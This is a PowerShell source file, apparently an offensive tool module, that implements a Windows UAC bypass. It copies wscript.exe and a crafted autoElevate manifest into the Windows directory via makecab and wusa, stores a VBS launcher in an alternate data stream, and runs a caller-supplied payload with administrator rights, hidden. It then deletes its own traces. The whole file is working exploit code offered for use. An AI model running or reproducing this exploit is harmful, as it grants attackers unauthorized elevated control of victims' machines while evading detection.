function Invoke-WScriptBypassUAC
{
    

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]
        $payload
    )

    function Local:Get-TempFileName {
        
        $sTempFolder = $env:Temp
        $sTempFolder = $sTempFolder + "\"
        $sTempFileName = [System.IO.Path]::GetRandomFileName() + ".tmp"
        $sTempFileName = $sTempFileName -split '\.',([regex]::matches($sTempFileName,"\.").count) -join ''
        $sTempFileNameFinal = $sTempFolder + $sTempFileName 
        return $sTempFileNameFinal
    }

    function Local:Invoke-CopyFile($sSource, $sTarget) {
       
       $sTempFile = Get-TempFileName
       Start-Process -WindowStyle Hidden -FilePath "$($env:WINDIR)\System32\makecab.exe" -ArgumentList "$sSource $sTempFile"
       $null = wusa "$sTempFile" /extract:"$sTarget" /quiet

       
       Start-Sleep -s 2
       
       
       Remove-Item $sTempFile
   }

    function Local:Invoke-WscriptTrigger {
        
        $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
        $ADSFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

        $VBSPayload = "Dim objShell:"
        $VBSPayload += "Dim oFso:"
        $VBSPayload += "Set oFso = CreateObject(""Scripting.FileSystemObject""):"
        $VBSPayload += "Set objShell = WScript.CreateObject(""WScript.Shell""):"
        $VBSPayload += "command = ""$payload"":"
        $VBSPayload += "objShell.Run command, 0:"
        
        
        $DelCommand = "$($env:WINDIR)\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del $($env:WINDIR)\wscript.exe&&del $($env:WINDIR)\wscript.exe.manifest"""""""""
        $VBSPayload += "command = ""$DelCommand"":"
        $VBSPayload += "objShell.Run command, 0:"
        $VBSPayload += "Set objShell = Nothing"

        $CreateWrapperADS = {cmd /C "echo $VBSPayload > ""$env:USERPROFILE\AppData:$ADSFile"""}
        Invoke-Command -ScriptBlock $CreateWrapperADS
        
        $ExecuteScript = {cmd /C "$($env:WINDIR)\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile"""}
        Invoke-Command -ScriptBlock $ExecuteScript
        Remove-ADS $env:USERPROFILE\AppData:$ADSFile
    }

    function Local:Invoke-WscriptElevate {

        $WscriptManifest =
@"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
          manifestVersion="1.0">
  <asmv3:trustInfo>
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </asmv3:trustInfo>
  <asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
      <autoElevate>true</autoElevate>
      <dpiAware>true</dpiAware>
    </asmv3:windowsSettings>
  </asmv3:application>
</assembly>
"@

        
        $sManifest = $env:Temp + "\wscript.exe.manifest"
        $WscriptManifest | Out-File $sManifest -Encoding UTF8

        Invoke-CopyFile $sManifest $env:WINDIR

        $WScriptPath = "$($env:WINDIR)\System32\wscript.exe"
        Invoke-CopyFile $WScriptPath $env:WINDIR
        Remove-Item -Force $sManifest

        
        Invoke-WscriptTrigger
    }

    function Local:Remove-ADS {
        
        [CmdletBinding()] Param(
            [Parameter(Mandatory=$True)]
            [string]$ADSPath
        )
     
        
        
        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
     
        $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
            @('kernel32.dll'),
            [Reflection.FieldInfo[]]@($SetLastError),
            @($True))
     
        
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
            'kernel32.dll',
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            [Type[]]@([String]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Ansi)
        $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
        
        $Kernel32 = $TypeBuilder.CreateType()
        
        $Result = $Kernel32::DeleteFile($ADSPath)

        if ($Result){
            Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
        }
        else{
            Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
        }
    }

    
    $OSVersion = [Environment]::OSVersion.Version
    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))){
        if(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $True){
            "[!] WARNING: You are already elevated!"
        }
        else {
            Invoke-WscriptElevate
        }
    }else{"[!] WARNING: Target Not Vulnerable"}
}
